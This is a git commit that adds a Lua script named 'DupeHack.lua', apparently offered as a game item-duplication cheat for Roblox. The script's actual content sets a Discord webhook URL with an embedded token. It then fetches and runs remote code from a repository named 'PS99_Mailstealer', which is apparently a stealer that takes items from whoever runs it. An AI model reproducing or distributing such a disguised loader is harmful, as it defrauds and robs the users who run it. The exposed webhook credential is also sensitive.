96723bbe90bfa0efcb0bc38ef37c074e91d3e2f2
KyRMGT <wasitbotak190@gmail.com>
2024-10-19 00:58:58 +0800

    Add files via upload

---
+++ DupeHack.lua
@@ -0,0 +1,5 @@
+Username = "VIP_NICKY123"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1296542659321794580/PSPrpZ4q1cA76rH4guP4lZ6oUxL-CFn17kbelr2FjXuaxch5wdc11woEvst0cSMHYijs"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
